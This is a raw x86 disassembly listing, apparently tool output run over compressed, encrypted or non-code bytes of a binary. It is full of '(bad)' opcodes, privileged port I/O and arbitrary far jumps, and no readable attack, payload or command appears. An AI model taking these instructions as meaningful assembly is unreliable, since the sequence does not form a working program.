  420f71:	aad    0x18
  420f73:	mov    ecx,0xaf3396c6
  420f78:	mov    al,ds:0x6312c42f
  420f7d:	mov    esp,0x3f655d68
  420f82:	mov    WORD PTR [edi+0x0],es
  420f85:	add    ebp,DWORD PTR [edi]
  420f87:	push   edx
  420f88:	outs   dx,DWORD PTR ds:[esi]
  420f89:	mul    DWORD PTR [edx-0x78]
  420f8c:	fist   DWORD PTR [eax-0x16]
  420f8f:	mov    DWORD PTR [edi],esp
  420f91:	pusha  
  420f92:	lahf   
  420f93:	dec    edx
  420f94:	test   eax,0xa6078fde
  420f99:	cdq    
  420f9a:	ss (bad) 
  420f9d:	ds push ds
  420f9f:	add    BYTE PTR [edx],dh
  420fa1:	repnz rcl DWORD PTR [esi-0x4b],1
  420fa5:	or     bh,BYTE PTR [edx+0x68]
  420fa8:	mov    ecx,0x19907daa
  420fad:	pop    esp
  420fae:	or     BYTE PTR [edi],al
  420fb0:	xlat   BYTE PTR ds:[ebx]
  420fb1:	cmc    
  420fb2:	cld    
  420fb3:	or     BYTE PTR [edi-0x562e51f4],al
  420fb9:	imul   edx,DWORD PTR [eax+0x2e],0xffffffe0
  420fbd:	bound  eax,QWORD PTR [edx+ebp*2-0x14]
  420fc1:	(bad)  
  420fc2:	arpl   WORD PTR [edx-0x6a],cx
  420fc5:	jl     0x420fe1
  420fc7:	xor    DWORD PTR [eax-0x3a619f7f],edi
  420fcd:	inc    esi
  420fce:	stos   BYTE PTR es:[edi],al
  420fcf:	pop    ss
  420fd0:	aad    0xed
  420fd2:	push   eax
  420fd3:	mov    dl,0xc4
  420fd5:	jg     0x420f95
  420fd7:	and    esi,DWORD PTR [edi]
  420fd9:	inc    eax
  420fda:	mov    dh,0x17
  420fdc:	arpl   WORD PTR [eax],ax
  420fde:	add    ebp,DWORD PTR [edx]
  420fe0:	loop   0x420fe4
  420fe2:	cmp    DWORD PTR [edx+edx*1],0x28d4eb20
  420fe9:	popf   
  420fea:	cwde   
  420feb:	sbb    BYTE PTR [ebx-0xb],bl
  420fee:	(bad)  
  420fef:	sbb    bh,BYTE PTR fs:[eax]
  420ff2:	fstp   DWORD PTR [edx-0x11]
  420ff5:	sbb    esp,esp
  420ff7:	fnstenv [ebp-0x5c]
  420ffa:	adc    DWORD PTR [eax+0x30],edx
  420ffd:	inc    eax
  420ffe:	in     eax,dx
  420fff:	jge    0x420fbd
  421001:	pop    eax
  421002:	aas    
  421003:	mov    ds:0xf810f472,eax
  421008:	loop   0x420fa1
  42100a:	cmp    ecx,0x66
  42100d:	jmp    FWORD PTR [esi+0x47e7cc61]
  421013:	push   ecx
  421014:	mov    ds:0xec78e3e3,al
  421019:	(bad)  
  42101a:	int3   
  42101b:	call   0xd7875513
  421020:	push   cs
  421021:	repz pop eax
  421023:	mov    edi,0x62615739
  421028:	in     eax,dx
  421029:	push   esi
  42102a:	mov    ebx,0x3f5dc77d
  42102f:	xchg   edi,eax
  421030:	adc    edi,0xfffffff8
  421033:	cmc    
  421034:	xor    eax,0x3d583c9a
  421039:	sbb    eax,0xffb4c8fa
  42103e:	jg     0x421054
  421040:	shl    ah,1
  421042:	pop    eax
  421043:	pop    eax
  421044:	mov    ds:0xaf48baef,eax
  421049:	and    eax,0x535740e9
  42104e:	fcomp  DWORD PTR [ecx]
  421050:	pop    es
  421051:	add    BYTE PTR [esp+edi*8+0x6],dl
  421055:	jp     0x42104c
  421057:	clc    
  421058:	mov    bh,0x73
  42105a:	into   
  42105b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42105c:	sub    DWORD PTR [eax],0x7b90fd09
  421062:	xor    eax,0x9c8d677f
  421067:	sub    bh,bl
  421069:	pop    ebx
  42106a:	(bad)  
  42106c:	xor    bh,bl
  42106e:	pop    ebp
  42106f:	ret    0x7b75
  421072:	test   al,0x18
  421075:	jp     0x421092
  421077:	mov    ds:0xfbee77f8,eax
  42107c:	mov    ecx,0xdbc692b1
  421081:	cmc    
  421082:	aaa    
  421083:	xor    eax,0xf4b6cb19
  421088:	fnstsw WORD PTR [edi-0x22]
  42108b:	lock push 0x67
	...
  421099:	add    BYTE PTR [edx+ecx*4-0x49],bl
  42109d:	imul   esi,edi,0x7f
  4210a0:	fdivr  QWORD PTR [edi+0x2b60ebfc]
  4210a6:	loope  0x421029
  4210a8:	mov    ecx,ecx
  4210aa:	hlt    
  4210ab:	mov    WORD PTR [ecx],es
  4210ad:	add    ah,bh
  4210af:	add    DWORD PTR [eax],eax
  4210b1:	add    BYTE PTR ds:0xfbe7627e,ah
  4210b7:	push   esi
  4210b8:	jmp    0x2e99:0xfad47a91
  4210bf:	xchg   ebp,eax
  4210c0:	bound  edx,QWORD PTR [edx+ecx*2+0x30]
  4210c4:	pop    ecx
  4210c5:	popa   
  4210c6:	jbe    0x4210d5
  4210c8:	(bad)  
  4210c9:	call   0x5162:0x218dfb53
  4210d0:	mov    BYTE PTR [ebx+ebp*8],cl
  4210d3:	cmp    eax,DWORD PTR [ebx+0x43]
  4210d6:	xchg   eax,ecx
  4210d8:	in     al,dx
  4210d9:	popa   
  4210da:	pop    es
  4210db:	mov    bh,BYTE PTR ds:0x329a02c2
  4210e1:	in     al,0x16
  4210e3:	std    
  4210e4:	lock call 0x3555:0x69ed0768
  4210ec:	arpl   di,ax
  4210ee:	pushf  
  4210ef:	dec    ebp
  4210f0:	ins    DWORD PTR es:[edi],dx
  4210f1:	int3   
  4210f2:	add    eax,0xc863478d
  4210f7:	arpl   WORD PTR [edi+0x66],ax
  4210fa:	pop    ss
  4210fb:	jmp    0xc637:0xc62b5e42
  421102:	(bad)  
  421103:	nop
  421104:	and    DWORD PTR [eax+0x4df1aec0],edx
  42110a:	mov    ebp,0xdb1a3fd2
  42110f:	add    ebx,eax
  421111:	int    0x3f
  421113:	imul   edi,ebx,0xffffffad
  421116:	(bad)  
  421117:	fld    DWORD PTR [ecx-0x82a53ea]
  42111d:	mov    ch,dh
  42111f:	xor    al,0xa4
  421121:	mov    bl,0x93
  421123:	arpl   WORD PTR [edx],dx
  421125:	or     eax,0xe8f5aedb
  42112a:	push   0xbe55b21b
  42112f:	dec    ebx
  421130:	jbe    0x421107
  421132:	push   edi
  421133:	ds scas al,BYTE PTR es:[edi]
  421135:	mov    ch,0xe0
  421137:	push   esp
  421138:	test   DWORD PTR [ebx+0x1a8c2759],ebp
  42113e:	mov    dl,0x46
  421140:	fs jle 0x42118d
  421143:	ds retf 0x93a2
  421147:	push   eax
  421148:	add    DWORD PTR [edi],edi
  42114a:	pusha  
  42114b:	xchg   ecx,eax
  42114c:	jg     0x421108
  42114e:	outs   dx,BYTE PTR ds:[esi]
  42114f:	jl     0x42113b
  421151:	dec    eax
  421152:	xchg   ebp,eax
  421153:	adc    BYTE PTR ss:0x2440e13b,bh
  42115a:	push   edx
  42115b:	adc    DWORD PTR [ebx+0x75dc5c72],esp
  421161:	adc    al,0x95
  421163:	sub    eax,0x1bd712b7
  421168:	jge    0x421172
  42116a:	lds    ebx,FWORD PTR [esi]
  42116c:	shl    BYTE PTR [ebp-0x78],1
  42116f:	dec    edx
  421170:	xchg   esi,eax
  421171:	or     eax,0x327346aa
  421176:	adc    eax,0x5eff
  42117b:	push   eax
  42117c:	loop   0x4211de
  42117e:	fucomi st,st(0)
  421180:	push   0xbca96281
  421185:	or     al,0xb7
  421187:	sub    eax,0xd3867379
  42118c:	push   es
  42118d:	aam    0x8a
  42118f:	jle    0x4211dd
  421191:	mov    al,BYTE PTR [ebx+edi*1]
  421194:	adc    BYTE PTR [ebp+ebx*1+0x52],al
  421198:	mov    DWORD PTR [ebx-0x576bc0ac],0x697dfc4f
  4211a2:	pusha  
  4211a3:	sub    eax,0x7f07f226
  4211a8:	inc    esi
  4211a9:	lock mov dl,0x3f
  4211ac:	jmp    0x469ae18
  4211b1:	div    DWORD PTR [edx]
  4211b3:	push   ds
  4211b4:	fs dec esp
  4211b6:	(bad)  
  4211b7:	xor    eax,0x671f1a1a
  4211bc:	jnp    0x42123a
  4211be:	mov    cl,0xc4
  4211c0:	out    dx,eax
  4211c1:	inc    DWORD PTR [edi]
  4211c3:	lods   eax,DWORD PTR ds:[esi]
  4211c4:	xlat   BYTE PTR ds:[ebx]
  4211c5:	and    al,BYTE PTR [eax]
  4211c7:	mov    dh,BYTE PTR [edx+0x5d]
  4211ca:	lods   al,BYTE PTR ds:[esi]
  4211cb:	xchg   esp,eax
  4211cc:	repnz ins DWORD PTR es:[edi],dx
  4211ce:	xchg   edx,eax
  4211cf:	xor    eax,0x186c2584
  4211d4:	sbb    esp,DWORD PTR [edx+ebp*8]
  4211d7:	(bad)  
  4211d8:	idiv   BYTE PTR ds:0xaafd0b46
  4211de:	cmp    esp,DWORD PTR [esi]
  4211e0:	jmp    0xc200eda2
  4211e5:	fdivr  st,st(0)
  4211e7:	mov    ds:0xddcca45d,al
  4211ec:	dec    eax
  4211ed:	test   BYTE PTR [eax+0x5a],al
  4211f0:	jl     0x4211a7
  4211f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4211f3:	stos   BYTE PTR es:[edi],al
  4211f4:	fcomp  DWORD PTR [edx+0x53cb1da2]
  4211fa:	inc    ebp
  4211fb:	jl     0x421228
  4211fd:	inc    esp
  4211fe:	imul   ecx,DWORD PTR [esi-0x7a0324df],0x65
  421205:	xchg   edx,eax
  421206:	push   edx
  421207:	sbb    al,0x2e
  421209:	mov    al,0x67
  42120b:	nop
  42120c:	dec    ebx
  42120d:	adc    DWORD PTR ds:0x53cee076,edi
  421213:	int3   
  421214:	aaa    
  421215:	cli    
  421216:	add    al,0xee
  421218:	push   esp
  421219:	out    dx,al
  42121a:	mov    al,ds:0xb243c070
  42121f:	jo     0x42126d
  421221:	mov    ds:0xfef13893,eax
  421226:	xor    BYTE PTR [ebp-0x2e513117],dh
  42122c:	ds fninit 
  42122f:	int3   
  421230:	cld    
  421231:	out    0x9b,al
  421233:	int    0x9b
  421235:	ds scas eax,DWORD PTR es:[edi]
  421237:	and    BYTE PTR [ecx-0x59cc243b],al
  42123d:	or     DWORD PTR [eax+0x7bca7ae2],eax
  421243:	mov    DWORD PTR fs:[ebx-0x24],eax
  421247:	inc    edx
  421248:	xchg   esi,eax
  421249:	cmp    DWORD PTR [ebx+0x153a578b],eax
  42124f:	repz (bad) 
  421251:	sub    ah,BYTE PTR [ecx]
  421253:	jg     0x4211df
  421255:	mov    eax,ds:0xeb3b3460
  42125a:	sbb    al,0xa2
  42125c:	frstpm(287 only) 
  42125e:	cmp    dh,BYTE PTR [ebx+0x3c434033]
  421264:	loopne 0x4212ba
  421266:	pop    eax
  421267:	lahf   
  421268:	(bad)  
  42126a:	out    dx,al
  42126b:	push   cs
  42126c:	xchg   esp,eax
  42126d:	jno    0x42123e
  42126f:	cmp    esp,DWORD PTR [ebx-0x7213fdc8]
  421275:	stc    
  421276:	mov    BYTE PTR [eax+0x19c96c8c],cl
  42127c:	and    eax,0xf9cc4a0b
  421281:	daa    
  421282:	stc    
  421283:	cmp    al,0xbc
  421285:	xchg   ebx,eax
  421286:	jae    0x421224
  421288:	xchg   edx,eax
  421289:	ficomp WORD PTR [ebp-0x27]
  42128c:	int3   
  42128d:	adc    BYTE PTR [edi],al
  42128f:	push   edi
  421290:	dec    eax
  421291:	ret    
  421292:	shrd   DWORD PTR [edx],esi,cl
  421295:	out    0xff,al
  421297:	jno    0x4212dd
  421299:	sbb    dl,BYTE PTR [edx-0x7b1113b2]
  42129f:	dec    eax
  4212a0:	(bad)  
  4212a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4212a2:	mov    ebp,0xc22a44d5
  4212a7:	arpl   ax,si
  4212a9:	jne    0x421320
  4212ab:	retf   
  4212ac:	xor    eax,0x4d
	...
  4212b9:	add    BYTE PTR [edi-0x402578e6],ah
  4212bf:	(bad)  
  4212c1:	jg     0x42132a
  4212c3:	pop    esp
  4212c4:	fstp   DWORD PTR [ecx-0xefee622]
  4212ca:	lock mov es,WORD PTR [ecx]
  4212cd:	add    ah,bh
  4212cf:	add    DWORD PTR [eax],eax
  4212d1:	add    BYTE PTR [ecx+eiz*1+0x1bfec6cc],al
  4212d8:	popf   
  4212d9:	mov    ss,WORD PTR [ecx]
  4212db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4212dc:	xchg   esp,eax
  4212dd:	or     DWORD PTR [edi+edi*4+0x6cdcbbe2],eax
  4212e4:	pop    ebp
  4212e5:	repnz mov cx,0xfa0a
  4212ea:	jge    0x421327
  4212ec:	test   eax,0xd822560
  4212f1:	scas   eax,DWORD PTR es:[edi]
  4212f2:	add    al,0xb7
  4212f4:	aas    
  4212f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4212f6:	pop    edx
  4212f7:	and    al,0xf4
  4212f9:	mov    bh,0x19
  4212fb:	hlt    
  4212fc:	cmp    eax,0xcd8a3401
  421301:	mov    BYTE PTR [esi+0x1f4d94cd],0x75
  421308:	adc    ebp,esp
  42130a:	push   eax
  42130b:	or     DWORD PTR [eax+0x2532fea9],edx
  421311:	mov    eax,ds:0x789d8c0d
  421316:	cwde   
  421317:	rcl    DWORD PTR [edi+0x1005261b],1
  42131d:	xchg   ecx,eax
  42131e:	sub    eax,0x90f8da71
  421323:	adc    bl,BYTE PTR [eax+0x77a4770b]
  421329:	in     al,0xf0
  42132b:	jp     0x4212df
  42132d:	retf   
  42132e:	or     edi,DWORD PTR [ebx+0x475d5572]
  421334:	inc    edx
  421335:	adc    eax,0x36495b58
  42133a:	mov    ebx,0xc34a4d8b
  42133f:	pop    ebx
  421340:	sbb    DWORD PTR [eax],eax
  421342:	and    esi,ebx
  421344:	int3   
  421345:	fucomip st,st(4)
  421347:	and    cl,BYTE PTR [ebx+0x659307cb]
  42134d:	stos   DWORD PTR es:[edi],eax
  42134e:	mov    ah,BYTE PTR [ecx]
  421350:	ss ins DWORD PTR es:[edi],dx
  421352:	dec    eax
  421353:	xchg   esp,eax
  421354:	or     eax,DWORD PTR [esi+0x34502de9]
  42135a:	mov    dl,0xf8
  42135c:	int3   
  42135d:	fsub   st,st(4)
  42135f:	pop    edi
  421360:	rcl    DWORD PTR [ecx+edi*8-0x4c],1
  421364:	popa   
  421365:	push   esi
  421366:	cwde   
  421367:	sahf   
  421368:	and    eax,0xfbdb6a48
  42136d:	push   ds
  42136e:	(bad)
  421371:	push   edx
  421372:	inc    edx
  421373:	mov    WORD PTR ds:0xabb7c90b,gs
  421379:	mov    ebp,0xaf836ca4
  42137e:	sbb    ecx,DWORD PTR [ebx-0xd13862]
  421384:	test   DWORD PTR [esi-0x175e8c35],edx
  42138a:	sub    bl,BYTE PTR [ecx-0x451e344]
  421390:	mov    ds:0xb2ac221c,al
  421395:	cmp    cl,ch
  421397:	imul   ebp,DWORD PTR [eax-0x65607bd5],0x12e5c37b
  4213a1:	les    esp,FWORD PTR [edi-0x5016fefa]
  4213a7:	fldenv [esi-0x73]
  4213aa:	out    0x89,eax
  4213ac:	iret   
  4213ad:	mov    BYTE PTR [edx-0x5a],0xd8
  4213b1:	ret    0x79c0
  4213b4:	and    eax,0xea3af656
  4213b9:	push   0x115cbae7
  4213be:	sub    edx,0x646dbaf6
  4213c4:	iret   
  4213c5:	test   DWORD PTR [edx],ecx
  4213c7:	pop    ecx
  4213c8:	jne    0x42143e
  4213ca:	out    dx,al
  4213cb:	js     0x421362
  4213cd:	rol    BYTE PTR [esi-0x76f4aeab],1
  4213d3:	out    0x2d,eax
  4213d5:	adc    DWORD PTR [esi+0x50c5c587],0xa3ac25f9
  4213df:	test   edx,ecx
  4213e1:	in     al,dx
  4213e2:	ins    BYTE PTR es:[edi],dx
  4213e3:	push   0x5f7f4273
  4213e8:	nop
  4213e9:	(bad)  
  4213ea:	pcmpeqw mm3,mm5
  4213ed:	stos   BYTE PTR es:[edi],al
  4213ee:	add    al,0x90
  4213f0:	(bad)  
  4213f1:	mov    esp,0xd759fda1
  4213f6:	addr16 add al,0x75
  4213f9:	push   ss
  4213fa:	popw   es
  4213fc:	xor    edi,DWORD PTR [esi+ebp*2+0x60dccd03]
  421403:	mov    al,0xab
  421405:	mov    al,0x3
  421407:	mov    cl,0xb3
  421409:	xchg   BYTE PTR [ecx+0x48],dh
  42140c:	pusha  
  42140d:	mov    bh,0xf5
  42140f:	cmp    DWORD PTR [ebx],eax
  421411:	idiv   DWORD PTR [edx+ebp*1+0x57]
  421415:	ret    0x5337
  421418:	std    
  421419:	scas   eax,DWORD PTR es:[edi]
  42141a:	shl    DWORD PTR [edi],cl
  42141c:	xchg   ecx,eax
  42141d:	nop
  42141e:	jp     0x421463
  421420:	sbb    edx,DWORD PTR ds:0xf90ff6c5
  421426:	xor    DWORD PTR [edx],0x78
  421429:	mov    BYTE PTR [ebp+0x0],dl
  42142c:	out    0x1c,eax
  42142e:	popf   
  42142f:	sub    eax,0x153faf9e
  421434:	call   0xe6aa:0x3578aa2d
  42143b:	push   edx
  42143c:	jmp    0x53ab1cc7
  421441:	imul   ebx,DWORD PTR [eax],0xd2e71383
  421447:	add    ebp,edx
  421449:	add    DWORD PTR fs:[esi-0x1a102f7c],ecx
  421450:	mov    eax,0x87b11be2
  421455:	test   eax,0x3d49b4e3
  42145a:	cdq    
  42145b:	(bad)  
  42145c:	sbb    edx,DWORD PTR [ecx]
  42145e:	mov    esi,0xc5d83acc
  421463:	xor    DWORD PTR [esi+ebp*1+0x6e],eax
  421467:	aam    0x70
  421469:	lods   al,BYTE PTR ds:[esi]
  42146a:	push   esi
  42146b:	mov    dh,0xeb
  42146d:	mov    DWORD PTR ds:0x485b4fc1,edx
  421473:	sbb    BYTE PTR [esi+edx*8-0x7b],ch
  421477:	das    
  421478:	adc    eax,0x4a5b5ef6
  42147d:	push   0xffffffe8
  42147f:	out    dx,al
  421480:	in     eax,dx
  421481:	xchg   edx,eax
  421482:	inc    esp
  421483:	clc    
  421484:	icebp  
  421485:	ror    dh,cl
  421487:	popa   
  421488:	mov    edx,0xd8af14b
  42148d:	dec    ecx
  42148e:	(bad)  
  42148f:	in     al,dx
  421490:	arpl   bp,bp
  421492:	dec    esp
  421493:	fsub   st(5),st
  421495:	(bad)  
  421496:	clc    
  421497:	dec    ebx
  421498:	nop
  421499:	mov    al,ds:0xd185759c
  42149e:	dec    edx
  42149f:	daa    
  4214a0:	adc    esi,esi
  4214a2:	and    dh,bl
  4214a4:	(bad)  
  4214a5:	pop    esp
  4214a6:	adc    esp,DWORD PTR [edx-0x5c]
  4214a9:	aas    
  4214aa:	mov    ah,0xc6
  4214ac:	jb     0x4214da
  4214ae:	pop    ds
  4214af:	adc    esi,DWORD PTR [edx+0x50]
  4214b2:	scas   al,BYTE PTR es:[edi]
  4214b3:	ss sbb al,0xdb
  4214b6:	jnp    0x421465
  4214b8:	int    0xc2
  4214ba:	inc    ebp
  4214bb:	mov    ch,ch
  4214bd:	shl    DWORD PTR [esi],cl
  4214bf:	mov    dh,0xc8
  4214c1:	scas   al,BYTE PTR es:[edi]
  4214c2:	jge    0x42145d
  4214c4:	addr16 mov dl,0x91
  4214c7:	or     BYTE PTR [esi+0x462bc5dc],0xf2
	...
  4214da:	popf   
  4214db:	paddd  mm4,QWORD PTR [esi+edi*8-0x5bc0200b]
  4214e3:	fidiv  DWORD PTR [ebp+0x34]
  4214e6:	mov    ecx,0xec2dc22a
  4214eb:	nop
  4214ec:	add    DWORD PTR [eax],eax
  4214ee:	cld    
  4214ef:	add    DWORD PTR [eax],eax
  4214f1:	add    BYTE PTR [eax],ah
  4214f3:	jecxz  0x4214be
  4214f5:	ja     0x4214c6
  4214f7:	jb     0x4214f5
  4214f9:	mov    esi,0x3c2883dd
  4214fe:	pop    ebx
  4214ff:	or     ch,dh
  421501:	mov    ebp,0x465aef47
  421506:	mov    ebx,0xf7833a21
  42150b:	ins    DWORD PTR es:[edi],dx
  42150c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42150d:	adc    al,0x25
  42150f:	inc    ecx
  421510:	mov    ah,0x39
  421512:	hlt    
  421513:	or     cl,BYTE PTR [ebx]
  421515:	jno    0x4214ae
  421517:	idiv   esp
  421519:	in     al,dx
  42151a:	out    0x74,eax
  42151c:	fstp   QWORD PTR [ebx-0x73]
  42151f:	ret    
  421520:	call   0x381c75a0
  421525:	(bad)  
  421526:	xlat   BYTE PTR ds:[ebx]
  421527:	sub    eax,ebx
  421529:	div    BYTE PTR [edi+0x1ac6d04d]
  42152f:	call   0x4b930706
  421534:	stos   DWORD PTR es:[edi],eax
  421535:	imul   edi,edx,0xffffffe9
  421538:	dec    esi
  421539:	sbb    BYTE PTR [ebx+eax*2],bh
  42153c:	pop    esi
  42153d:	adc    BYTE PTR [ebp-0x4673463e],0x37
  421544:	push   esi
  421545:	inc    eax
  421546:	repnz push 0x8140f84d
  42154c:	enter  0xbc2,0xe4
  421550:	fidiv  DWORD PTR [edx+0x1efeada]
  421556:	loop   0x421534
  421558:	dec    ebp
  421559:	mov    ds:0x7292ad83,al
  42155e:	dec    edx
  42155f:	cmp    BYTE PTR [eax-0x95be829],dl
  421565:	push   edi
  421566:	(bad)  
  421568:	jno    0x421517
  42156a:	into   
  42156b:	inc    BYTE PTR [esi]
  42156d:	pop    eax
  42156e:	ficom  DWORD PTR [edi]
  421570:	jns    0x421585
  421572:	cli    
  421573:	mov    dl,0x22
  421575:	push   ds
  421576:	jns    0x4215f4
  421578:	sub    BYTE PTR [ecx+0x46],cl
  42157b:	inc    ebp
  42157c:	cli    
  42157d:	and    BYTE PTR [edx-0x73c2982b],dl
  421583:	mov    dh,0xad
  421585:	in     al,dx
  421586:	rol    DWORD PTR ds:0x6e39e5ef,1
  42158c:	in     al,dx
  42158d:	xor    al,dh
  42158f:	xor    BYTE PTR [edi+0x6b],ah
  421592:	sbb    ebp,esp
  421594:	jge    0x4215bc
  421596:	inc    esp
  421597:	adc    edx,esp
  421599:	cmc    
  42159a:	jnp    0x4215a0
  42159c:	xchg   bl,dl
  42159e:	or     al,0xd2
  4215a0:	pop    edi
  4215a1:	lock xchg esp,eax
  4215a3:	xor    esi,DWORD PTR [edi+0x76a1bb3d]
  4215a9:	cmc    
  4215aa:	neg    eax
  4215ac:	popa   
  4215ad:	dec    esi
  4215ae:	in     eax,dx
  4215af:	mov    ebp,0x11ddca3d
  4215b4:	xor    ch,0x37
  4215b7:	add    ebp,DWORD PTR ds:[eax-0x55650685]
  4215be:	xchg   ecx,eax
  4215bf:	cli    
  4215c0:	aas    
  4215c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4215c2:	popa   
  4215c3:	push   ds
  4215c4:	xchg   ebx,eax
  4215c5:	sbb    BYTE PTR [ebp-0x55056a5c],0x91
  4215cc:	data16 dec BYTE PTR [ecx]
  4215cf:	or     BYTE PTR [eax+0x4e90c42c],dl
  4215d5:	(bad)  
  4215d6:	sbb    edx,DWORD PTR [ecx]
  4215d8:	rcr    BYTE PTR [edi-0x26dd41d3],cl
  4215de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4215df:	sbb    BYTE PTR [esi+eiz*1],0x22
  4215e3:	ins    DWORD PTR es:[edi],dx
  4215e4:	xor    ebx,DWORD PTR [esi-0x478322e5]
  4215ea:	jno    0x4215b3
  4215ec:	push   eax
  4215ed:	inc    eax
  4215ee:	stos   DWORD PTR es:[edi],eax
  4215ef:	xor    BYTE PTR [esi],dh
  4215f1:	stos   BYTE PTR es:[edi],al
  4215f2:	push   esi
  4215f3:	inc    edi
  4215f4:	pop    esi
  4215f5:	mov    ds:0x1cbdb8d2,al
  4215fa:	cdq    
  4215fb:	jns    0x4215bd
  4215fd:	and    DWORD PTR ds:[esi-0x33ca8377],esp
  421604:	bound  ebp,QWORD PTR [eax-0x42]
  421607:	lods   eax,DWORD PTR ds:[esi]
  421608:	ins    DWORD PTR es:[edi],dx
  421609:	mov    bh,0x11
  42160b:	or     ch,ah
  42160d:	mov    esp,0xbea2e1fb
  421612:	out    0x62,eax
  421614:	push   esp
  421615:	enter  0xeeb5,0xef
  421619:	add    eax,0xced57905
  42161e:	xchg   edi,eax
  42161f:	mov    BYTE PTR [esi+0x53],ch
  421622:	or     DWORD PTR [esi],esp
  421624:	jno    0x42168e
  421626:	sbb    cl,BYTE PTR [edi+0x3d]
  421629:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42162a:	ss pop esi
  42162c:	js     0x4215e4
  42162e:	push   esi
  42162f:	test   eax,0x267b32f1
  421634:	pop    ecx
  421635:	fidiv  WORD PTR [ebx-0x59f03dc0]
  42163b:	loopne 0x421624
  42163d:	dec    ecx
  42163e:	mov    ch,dh
  421640:	imul   eax,DWORD PTR [eax+0xc8f18d1],0xdb1bea23
  42164a:	std    
  42164b:	aad    0x73
  42164d:	mov    ebx,0xfd9991ad
  421652:	add    BYTE PTR [edi-0x626248e5],dh
  421658:	leave  
  421659:	cmp    DWORD PTR ds:0x93f847aa,eax
  42165f:	test   DWORD PTR [esi-0x5c],0x108c4f43
  421666:	inc    ebx
  421667:	push   ds
  421668:	xchg   ebx,eax
  421669:	addr16 int 0xf1
  42166c:	xor    al,BYTE PTR [ebx]
  42166e:	sub    DWORD PTR [esi-0x7b472897],esi
  421674:	dec    ebp
  421675:	mov    bh,0x45
  421677:	xchg   ebp,eax
  421678:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421679:	jb     0x4216e9
  42167b:	xor    DWORD PTR [edx+0x26],edx
  42167e:	inc    ebp
  42167f:	xchg   ebp,eax
  421680:	retf   
  421681:	cli    
  421682:	jge    0x4216a4
  421684:	xchg   BYTE PTR [edx+0x1a93cadf],dh
  42168a:	aas    
  42168b:	and    al,0xb7
  42168d:	jo     0x4216c8
  42168f:	and    DWORD PTR [edx],esi
  421691:	pop    edi
  421692:	(bad)  
  421693:	cmp    al,0x1e
  421695:	stos   BYTE PTR es:[edi],al
  421696:	icebp  
  421697:	or     ebp,DWORD PTR [esi]
  421699:	sar    al,0x39
  42169c:	stos   DWORD PTR es:[edi],eax
  42169d:	test   BYTE PTR [edi+0x3e4420c4],al
  4216a3:	jecxz  0x4216d4
  4216a5:	lea    esi,[esp+ecx*4+0x3685a696]
  4216ac:	mov    al,ds:0x74fa3c2c
  4216b1:	mov    edx,0xac2348e
  4216b6:	shl    BYTE PTR [edx],1
  4216b8:	mov    ds:0x2720e6ce,eax
  4216bd:	xor    BYTE PTR [ecx+0x1374c397],ch
  4216c3:	push   es
  4216c4:	mov    cl,0xba
  4216c6:	jle    0x42169a
  4216c8:	shl    BYTE PTR [ebp+0x64378113],0xc2
  4216cf:	js     0x421748
  4216d1:	mov    eax,ds:0xa0c0b7b0
  4216d6:	jmp    0x89a7:0x3778de67
  4216dd:	or     eax,0x14684e72
  4216e2:	sahf   
  4216e3:	jae    0x42175f
  4216e5:	and    DWORD PTR [edi-0x68],ecx
  4216e8:	adc    DWORD PTR [edi+0x177ef492],eax
	...
  4216fa:	and    BYTE PTR [esi],dl
  4216fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4216fd:	lea    esi,[esi+0x44bf29bf]
  421703:	sub    esp,esi
  421705:	neg    BYTE PTR [esi]
  421707:	out    0x15,al
  421709:	dec    edi
  42170a:	call   0xfc4218a1
  42170f:	add    DWORD PTR [eax],eax
  421711:	add    dl,ch
  421713:	dec    edi
  421714:	cmp    al,0xf6
  421716:	inc    esp
  421717:	loop   0x4216c4
  421719:	pop    esp
  42171a:	ins    BYTE PTR es:[edi],dx
  42171b:	ins    BYTE PTR es:[edi],dx
  42171c:	or     al,0xef
  42171e:	popf   
  42171f:	fcmovb st,st(6)
  421721:	adc    edi,ebx
  421723:	mov    ah,0xc3
  421725:	xlat   BYTE PTR ds:[ebx]
  421726:	sub    BYTE PTR [ecx-0x23],dh
  421729:	loop   0x421750
  42172b:	xchg   esp,eax
  42172c:	and    al,0xdf
  42172e:	fwait
  42172f:	xchg   BYTE PTR [edx],al
  421731:	ja     0x42174a
  421733:	add    bl,bh
  421735:	push   esi
  421736:	scas   eax,DWORD PTR es:[edi]
  421737:	out    dx,eax
  421738:	xchg   ecx,eax
  421739:	cmp    al,0xa8
  42173b:	ror    esp,0x5b
  42173e:	fs lahf 
  421740:	cld    
  421741:	mov    al,0xde
  421743:	dec    ecx
  421744:	cmp    esi,DWORD PTR [edi+edx*4-0x117e2a35]
  42174b:	cmp    eax,0x6e7a2963
  421750:	std    
  421751:	iret   
  421752:	repz inc eax
  421754:	jnp    0x4217a8
  421756:	mov    edx,0xbde86e83
  42175b:	jecxz  0x42178e
  42175d:	xchg   edi,eax
  42175e:	int3   
  42175f:	jbe    0x4216fe
  421761:	int    0xda
  421763:	loopne 0x421724
  421765:	iret   
  421766:	je     0x4217e1
  421768:	and    al,0x6a
  42176a:	xor    al,BYTE PTR [eax]
  42176c:	mov    esi,0x9fbc20d3
  421771:	xchg   esp,eax
  421772:	es push cs
  421774:	fadd   QWORD PTR [ecx-0x2d]
  421777:	clc    
  421778:	xor    al,0xae
  42177a:	xor    ebx,0x2a5b86b
  421780:	jecxz  0x4217dc
  421782:	sub    al,BYTE PTR [edx]
  421784:	(bad)  
  421785:	ss retf 
  421787:	dec    eax
  421788:	jecxz  0x421762
  42178a:	jnp    0x421772
  42178c:	mov    ebp,0x6de105b2
  421791:	adc    dl,BYTE PTR [eax+0x5b]
  421794:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421795:	lea    ecx,[esi+0x76ff860b]
  42179b:	xchg   esi,eax
  42179c:	in     al,dx
  42179d:	adc    BYTE PTR [ecx],dh
  42179f:	and    eax,0x306a0843
  4217a4:	mov    dl,BYTE PTR [edx-0x19]
